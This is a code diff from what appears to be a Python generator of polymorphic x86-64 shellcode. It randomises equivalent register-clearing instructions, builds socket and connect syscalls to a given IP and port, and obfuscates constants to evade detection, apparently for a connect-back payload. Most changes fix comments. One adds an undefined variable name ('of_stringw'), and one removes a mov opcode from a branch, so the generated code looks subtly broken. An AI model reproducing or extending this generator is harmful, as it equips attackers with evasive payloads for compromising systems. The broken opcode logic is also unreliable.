@@ -205,19 +205,19 @@ def clean(reg):
         l = ["4831c0", "4829c0"] # xor rax, rax or sub rax, rax 
         return l[r(0,1)]
     elif str(reg) == "rbx":
-        l = ["4831db","4829db"] # xor rax, rax or sub rax, rax 
+        l = ["4831db","4829db"] # xor rbx, rbx or sub rbx, rbx 
         return l[r(0,1)]
     elif str(reg) == "rcx":
-        l = ["4831c9","4829c9"] # xor rax, rax or sub rax, rax 
+        l = ["4831c9","4829c9"] # xor rcx, rcx or sub rcx, rcx 
         return l[r(0,1)]
     elif str(reg) == "rdx":
-        l = ["4831d2","4829d2"] # xor rax, rax or sub rax, rax 
+        l = ["4831d2","4829d2"] # xor rdx, rdx or sub rdx, rdx 
         return l[r(0,1)]
     elif str(reg) == "rsi":
-        l = ["4831f6", "48c1ee10"] # xor rax, rax or sub rax, rax 
+        l = ["4831f6", "48c1ee10"] # xor rsi, rsi or sub rsi, rsi 
         return l[r(0,1)]
     elif str(reg) == "rdi":
-        l = ["4831ff","48c1ef10"] # xor rax, rax or sub rax, rax 
+        l = ["4831ff","48c1ef10"] # xor rdi, rdi or sub rdi, rdi 
         return l[r(0,1)]
 
 
@@ -227,7 +227,7 @@ def create_socket():
     global PAYLOAD
     # syscall
     PAYLOAD += "b029" if r(0,1) else "0429"
-    # mov bl, 0x02; mov rdi, rbx le deuxième à add bl, 0x02, mov rdi, rbx inc rdi, inc rdi
+    # mov bl, 0x02; mov rdi, rbx add bl, 0x02, mov rdi, rbx inc rdi
     rand = r(0,2)
     if rand == 0:
         PAYLOAD += "b3024889df"
@@ -263,8 +263,9 @@ def socket_connect(ip, port):
         random1 = factorOffus("042a")
         of_string = offus("042a", random1)
         #Inverse en mirroir tout la chaine pour op code
-        of_string = of_string[::-1]
+        of_string = of_stringw[::-1]
         print("2:", of_string)
+        PAYLOAD += clean("rbx")
         PAYLOAD += "48bb"
         PAYLOAD+= of_string
         print("2: ", add_string)
@@ -281,7 +282,6 @@ def socket_connect(ip, port):
         #Inverse en mirroir tout la chaine pour op code
         of_string = of_string[::-1]
         print("2:", of_string)
-        PAYLOAD += "48bb"
         PAYLOAD+=of_string
         print("2: ", add_string)
         #Désoffuscation
